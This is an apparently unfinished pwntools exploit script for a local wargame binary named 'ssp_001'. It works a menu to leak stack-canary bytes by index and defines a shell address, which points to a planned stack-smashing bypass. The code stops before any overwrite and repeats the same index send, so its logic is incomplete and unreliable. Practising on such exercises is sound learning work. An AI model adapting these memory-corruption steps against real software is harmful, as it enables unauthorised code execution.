from pwn import *
from pathlib import Path

# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))

# Connect
p = process('./ssp_001')

# Set Context
context.arch = 'i386'
context.endian = 'little'
context.log_level = 'debug'

addr_sh = 0x80486b9

p.sendafter('> ', b'F')
p.sendafter('box input : ', b'A'*0x40)
p.sendafter('> ', b'P')
p.sendafter('Element index : ', p32(int('0x1a', 16)))
p.sendafter('Element index : ', p32(int('0x1a', 16)))




p.recvline()